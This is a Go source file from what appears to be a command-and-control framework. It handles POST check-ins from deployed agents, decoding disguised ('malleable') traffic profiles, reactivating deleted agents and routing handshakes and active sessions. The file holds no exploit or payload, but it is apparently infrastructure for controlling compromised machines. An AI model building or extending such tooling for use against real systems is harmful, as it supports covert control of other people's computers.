// internal/agent/listeners/handler_post.go
package listeners

import (
	"c2/internal/common/config"
	"database/sql"
	"log"
	"net/http"
)

// handlePostRequestWithProfile handles POST requests for profile-bound listeners
// Used by shared port routing when a profile is explicitly bound
// Supports malleable transforms via DataBlock configuration
func (m *Manager) handlePostRequestWithProfile(w http.ResponseWriter, r *http.Request, postProfile *config.PostProfile) {
	log.Printf("[%s] Processing request using profile: %s", r.Method, postProfile.Name)

	var clientID string
	var err error

	// Check if profile uses DataBlock for clientID (malleable transforms)
	if postProfile.ClientID != nil {
		// Use DataBlock-aware extraction with transform reversal
		// Note: ClientID extraction uses static profile key (empty xorKeyOverride)
		clientID, err = m.extractClientIDFromDataBlock(r, postProfile.ClientID, config.Handler{}, postProfile.Path, "")
		if err != nil {
			// DataBlock extraction failed - fall back to legacy extraction
			// This is needed because initial handshake always uses legacy JSON format
			log.Printf("[%s] DataBlock extraction from %s failed (%v), trying legacy params extraction",
				r.Method, postProfile.ClientID.Output, err)

			// Build legacy handler with profile's params for fallback
			handler := config.Handler{
				Path:    postProfile.Path,
				Method:  postProfile.Method,
				Enabled: true,
				Params:  postProfile.Params,
			}
			log.Printf("[%s] Legacy handler has %d params", r.Method, len(handler.Params))

			clientID, err = m.extractClientID(r, handler)
			if err != nil {
				log.Printf("[%s] Legacy extraction also failed: %v (URL: %s)", r.Method, err, r.URL.String())
				http.Error(w, "Bad Request", http.StatusBadRequest)
				return
			}
			log.Printf("[%s] Extracted client ID via legacy fallback: %s", r.Method, clientID)
		} else {
			log.Printf("[%s] Extracted client ID via DataBlock from %s: %s", r.Method, postProfile.ClientID.Output, clientID)
		}
	} else {
		// Legacy: Extract clientID using profile's params
		handler := config.Handler{
			Path:    postProfile.Path,
			Method:  postProfile.Method,
			Enabled: true,
			Params:  postProfile.Params,
		}
		clientID, err = m.extractClientID(r, handler)
		if err != nil {
			log.Printf("[%s] Failed to extract client ID: %v", r.Method, err)
			http.Error(w, "Bad Request", http.StatusBadRequest)
			return
		}
	}

	log.Printf("[%s] Extracted client ID: %s", r.Method, clientID)

	// Check async handler availability
	var asyncHandler *AsyncHandler
	var hasAsync bool
	if m.asyncEnabled {
		asyncHandler, hasAsync = m.handler.(*AsyncHandler)
	}

	// First check reactivation
	if initData, err := m.GetInitData(clientID); err == nil {
		var deletedAt sql.NullTime
		err := m.db.QueryRow(`
			SELECT deleted_at
			FROM connections
			WHERE newclientid = $1`, clientID).Scan(&deletedAt)

		if err == nil && deletedAt.Valid {
			if _, err := m.db.Exec(`
				UPDATE connections
				SET deleted_at = NULL,
					lastSEEN = CURRENT_TIMESTAMP
				WHERE newclientid = $1`, clientID); err != nil {
				log.Printf("Failed to reactivate agent: %v", err)
				http.Error(w, "Internal Server Error", http.StatusInternalServerError)
				return
			}
			notification := m.createReactivationNotification(clientID, initData, r.RemoteAddr)
			if err := m.notifyWebsocketService(notification); err != nil {
				log.Printf("Warning: Failed to notify about agent reactivation: %v", err)
			}
		}
	}

	// Check if this is an init request
	initData, err := m.validateClientID(clientID)
	if err == nil {
		log.Printf("[%s] Found init data for client %s, handling initial handshake", r.Method, clientID)
		if err := m.handleInitialHandshake(w, r, initData); err != nil {
			log.Printf("[%s] Initial handshake failed: %v", r.Method, err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		return
	}

	// Check for active session
	activeConn, err := m.activeConnections.GetConnection(clientID)
	if err != nil {
		log.Printf("[%s] No active connection found: %v", r.Method, err)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	// Use async or sync handler
	if hasAsync && asyncHandler != nil {
		asyncHandler.handleActiveConnectionAsync(w, r, activeConn, postProfile)
	} else {
		m.handleActiveConnection(w, r, activeConn, m.db, postProfile)
	}
}
